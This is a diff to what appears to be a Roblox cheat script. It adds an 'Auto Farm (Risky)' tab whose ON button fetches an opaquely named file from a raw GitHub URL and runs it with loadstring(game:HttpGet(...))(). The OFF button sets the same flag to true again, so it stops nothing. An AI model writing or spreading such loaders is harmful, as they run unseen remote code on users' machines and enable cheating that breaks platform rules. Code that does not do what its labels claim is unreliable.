@@ -130,3 +130,37 @@ Tab3:AddButton({
         TPS:TeleportToPlaceInstance(_place,Server.id,game:GetService('Players').LocalPlayer)
     end
 })
+
+local Tab = Window:MakeTab({
+    Name = "Auto Farm (Risky) ⚠",
+    PremiumOnly = false
+})
+
+Tab:AddButton({
+    Name = "ON / Auto Farm Wins (Risky)",
+    Callback = function()
+        OrionLib:MakeNotification({
+            Name = "Auto Farm Wins Risky has started!",
+            Content = "",
+            Image = "rbxassetid://4483345998",
+            Time = 5
+        })
+        _G.veryrisky = true
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/MysticCipherLuminaraPVQW8913/AKKCJSU/main/j2h5k8l3a7s4"))()
+        print("Successful ✔ (ON)")
+    end
+})
+
+Tab:AddButton({
+    Name = "OFF / Auto Farm Wins (Risky)",
+    Callback = function()
+        OrionLib:MakeNotification({
+            Name = "Auto Farm Wins Risky has stopped!",
+            Content = "",
+            Image = "rbxassetid://4483345998",
+            Time = 5
+        })
+        _G.veryrisky = true
+        print("Successful ✔ (OFF)")
+    end
+})
